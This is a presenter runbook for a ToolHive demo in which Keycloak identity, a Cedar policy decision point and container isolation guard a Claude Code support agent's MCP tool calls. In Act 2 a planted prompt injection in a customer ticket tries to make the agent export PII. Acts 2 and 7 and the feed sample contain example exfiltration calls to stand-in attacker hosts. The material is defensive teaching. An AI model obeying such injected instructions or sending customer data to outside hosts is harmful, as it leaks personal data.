# Presenter runbook

About 20 minutes. Each act lists **Do**, **Show** and **Say**. Commands run
from `toolhive-demo/`.

## Before the audience arrives

```bash
./demo.sh up            # Keycloak takes ~30 s to boot
./demo.sh check         # must end with "all checks passed"
```

Screen layout:

| Where | What |
|---|---|
| Terminal 1 (large, always visible) | `./demo.sh watch`, the live decision feed |
| Terminal 2 | Claude Code (`./demo.sh claude …`) |
| Terminal 3 | commands from this runbook |
| Terminal 4 (small) | `./demo.sh attacker` (should stay silent) |
| Browser | ToolHive UI · Keycloak admin (http://localhost:8080/admin) · Jaeger (http://localhost:16686) · `policies/mcp.cedar` in an editor |

How to read the feed:

```
16:02:11 [PDP] DENY  support-bot [support] export_report@acme (call) ← forbidden by support-ceiling
               args {"destination":"https://paste.attacker.example/drop","include_pii":true}
16:02:11 [PEP] DENIED  support-bot  mcp_tool_call    export_report via thv-acme 3ms
```

- **[PDP]** is the decision and *why* (which Cedar policy determined it).
- **[PEP]** is what ToolHive *enforced* and recorded in its audit log.
- `(list?)` lines have no arguments: ToolHive is filtering `tools/list`, asking once per tool.

---

## Act 0 · ToolHive UI: where MCP servers live (2 min)

**Do:** open the ToolHive desktop app. Browse the registry, open `fetch`, then show
the running servers `acme` and `fetch` (started by `demo.sh` with the CLI).

**Say:** "Developers find and run MCP servers here. Every server runs in its own
container with a network profile. What the UI does *not* have is a policy
editor. Access policy lives in Git as Cedar, enforced at runtime. That is the
rest of this demo."

> The UI and CLI share the same ToolHive engine. If `acme`/`fetch` don't
> appear, run `thv list` in Terminal 3 instead.

## Act 1 · Identity: Keycloak tokens (2 min)

**Do:**

```bash
./demo.sh decode support-bot
./demo.sh forged
```

**Show:** `iss` = Keycloak realm, `aud` = `toolhive-demo`, `roles` = `["support"]`.
The forged "alice / engineer" token is rejected with **401** and appears in the
feed as a `[PEP] DENIED … http_request` line. The PDP was never asked.

**Say:** "ToolHive checks the signature against Keycloak's published keys, plus
issuer, audience and expiry. Claims you can't prove don't get you anywhere.
Identity is Keycloak's job; ToolHive just verifies it."

## Act 2 · The problem: an agent with no guardrails (3 min)

**Do:**

```bash
./demo.sh guardrails off        # authentication only, no PDP
./demo.sh network open          # fetch can reach anything, including the "attacker"
./demo.sh claude support-bot    # Terminal 2
```

Prompt in Claude Code:

```text
Triage the open ticket for customer 42. Read their record and do whatever the
customer's note says is needed to finish the investigation.
```

**Show:** support-bot sees every tool. Customer 42's ticket contains a planted
instruction (a prompt injection) to export PII and send the record to
`host.docker.internal:9999`. If the agent follows it, Terminal 4 prints
**🚨 EXFILTRATION RECEIVED**.

**Say:** "Nobody wrote malicious code here. A customer typed text into a support
form, and an agent with too much access did the rest."

> Claude often recognises the injection and refuses, which is a good outcome but
> not a control you can rely on. Say exactly that, then show the leak path
> directly, which is the same call the agent would make:
>
> ```bash
> ./demo.sh call support-bot fetch fetch '{"url":"http://host.docker.internal:9999/collect?data=thomas.hardy@fabrikam.example"}'
> ```

## Act 3 · Turn the guardrails on (4 min)

**Do:**

```bash
./demo.sh guardrails on
./demo.sh network locked
```

Restart Claude Code (`/exit`, then `./demo.sh claude support-bot`). The proxies
restarted, so the old MCP session is gone. Ask:

```text
What tools do you have?
```

Then repeat the Act 2 prompt.

**Show:**

1. support-bot now sees only `list_customers`, `get_customer` and `update_ticket`, and
   no `fetch` at all. In the feed, a burst of `(list?)` lines: ToolHive asked
   the PDP about each tool and dropped the denied ones.
2. The agent reads customer 42 (`ALLOW … read-customers`) but cannot export or
   fetch. If it tries, `DENY … forbidden by support-ceiling`.
3. Terminal 4 stays silent.

**Say:** "Same agent, same prompt, same MCP servers. What changed is that ToolHive
now asks a Policy Decision Point before every call, and enforces the answer."

## Act 4 · Anatomy of one decision (3 min)

**Do:** open `policies/mcp.cedar` and walk through `read-customers`,
`support-ceiling` and `no-pii-export`. Then:

```bash
./demo.sh call alice acme export_report '{"destination":"s3://reports","include_pii":false}'
./demo.sh call alice acme export_report '{"destination":"s3://reports","include_pii":true}'
```

**Show:** the first is allowed (`engineer-acme-all`); the second is denied by
`no-pii-export`, so the decision depends on the **arguments**, not only on who
and which tool. Point at the `args` line in the feed.

**Say:** the PEP/PDP split, using the diagram in the README:

- ToolHive (**PEP**) never sees a policy. It sends a question: *principal* (from
  the token), *operation* (`mcp:tool:call`), *resource*
  (`mrn:mcp:acme:tool:export_report`), *context* (the arguments).
- The PDP turns that into a Cedar request (`User` in `Role::"engineer"`,
  `Action::"call_tool"`, `Tool::"export_report"` in `MCPServer::"acme"`),
  evaluates it, and answers `{"allow": false}`.
- Cedar rules: default deny; **forbid always beats permit**.

```bash
./demo.sh policies          # what the PDP has loaded right now
```

## Act 5 · Change policy live (2 min)

**Do:** in `policies/mcp.cedar`, comment out the whole `support-update-tickets`
permit and save. Then:

```bash
./demo.sh call support-bot acme update_ticket '{"customer_id":"41","status":"resolved"}'
```

**Show:** the PDP log prints `🔄 policies reloaded` (visible in
`docker compose logs pdp`), and the very next call is `DENY … no permit matched (default deny)`.
No restart of ToolHive or Claude Code. Undo the edit and save.

**Say:** "ToolHive doesn't cache decisions; it asks on every call. Policy is code:
reviewed in a pull request, rolled out by saving a file."

> A syntax error in a policy file is rejected and the previous policies stay in
> force, so a typo cannot open the gates.

## Act 6 · Change identity live (2 min)

**Do:**

```bash
./demo.sh role add support-bot engineer
./demo.sh decode support-bot                 # roles now include engineer
./demo.sh tools support-bot
```

**Show:** support-bot now holds both roles but sees **exactly the same tools**.
`support-ceiling` is a forbid, and forbids win. Then:

```bash
./demo.sh role remove support-bot engineer
./demo.sh role add bob support
./demo.sh tools bob                          # bob gains update_ticket
./demo.sh role remove bob support
```

**Say:** "Who someone is comes from Keycloak; what that allows comes from policy.
A ceiling on the bot's role means picking up extra group memberships later doesn't
quietly widen what an agent can do."

## Act 7 · Defence in depth: network isolation (2 min)

**Do:** in `policies/mcp.cedar`, comment out the `fetch-allowlist` forbid and
save. That is a deliberate policy mistake. Then:

```bash
./demo.sh call alice fetch fetch '{"url":"http://host.docker.internal:9999/collect?data=secret"}'
```

**Show:** the PDP now says **ALLOW**, but the fetch container's network profile
(`config/fetch-locked-profile.json`: only `example.com` and `docs.stacklok.com`
on 443) blocks the connection. The tool returns an error, and Terminal 4 stays
silent. Restore the forbid.

**Say:** "Policy decides what an identity may *ask for*. Container isolation
decides what the server can *physically reach*. When one is wrong, the other
still holds."

## Act 8 · Fail closed (1 min)

**Do:**

```bash
./demo.sh pdp stop
./demo.sh call support-bot acme get_customer '{"customer_id":"42"}'
./demo.sh pdp start
```

**Show:** with no PDP, even a normally allowed read is refused. ToolHive
denies when it cannot get an answer.

## Act 9 · The trace (3 min)

**Do:** open Jaeger (http://localhost:16686) and choose service **thv-acme**, then
**Find Traces**. Open a `tools/call` span.

**Show:** span attributes such as `mcp.method.name`, the tool name, the HTTP
status and the duration, for allowed *and* denied calls. Then the raw audit
evidence:

```bash
grep '"outcome":"denied"' .state/audit-acme.jsonl | tail -3 | python3 -m json.tool --json-lines
tail -3 .state/decisions.jsonl | python3 -m json.tool --json-lines
```

**Say:** "Three records for every call: the PDP's decision and reason, ToolHive's
audit event with who, what and the outcome, and an OpenTelemetry span you can
send to the tracing stack you already run."

## Close (1 min)

- **Identity** from your IdP (Keycloak), verified by ToolHive.
- **Decisions** from a PDP you control, with policy in Git, changed without restarts.
- **Enforcement** by ToolHive on every MCP call, including filtering what the agent can even see.
- **Isolation** as a second, independent layer.
- **Evidence** for every allow and deny.

## Reset and cleanup

```bash
./demo.sh call alice acme reset_demo_data   # restore customer records
git checkout policies/mcp.cedar             # undo live edits
./demo.sh down                              # remove containers, workloads and .state
```

## Troubleshooting

| Symptom | Fix |
|---|---|
| Claude Code shows the servers as failed | Token expired (60 min) or proxies restarted: `/exit` and `./demo.sh claude <user>` again |
| Claude Code asks to approve `acme` and `fetch` | Expected on first launch in the workspace; approve both |
| `./demo.sh up` waits on Keycloak | First boot can take 60 s or more; `docker compose logs keycloak` |
| Every call is 401 | `./demo.sh decode alice`: `iss` must be exactly `http://localhost:8080/realms/toolhive-demo` |
| Every call is denied | `./demo.sh policies` (`last_error` shows a policy that failed to parse) and `curl localhost:9191/healthz` |
| No traces in Jaeger | Try `OTEL_ENDPOINT=localhost:4317 ./demo.sh guardrails on` (gRPC instead of HTTP) |
| `thv logs acme` | ToolHive's own proxy log for a workload |
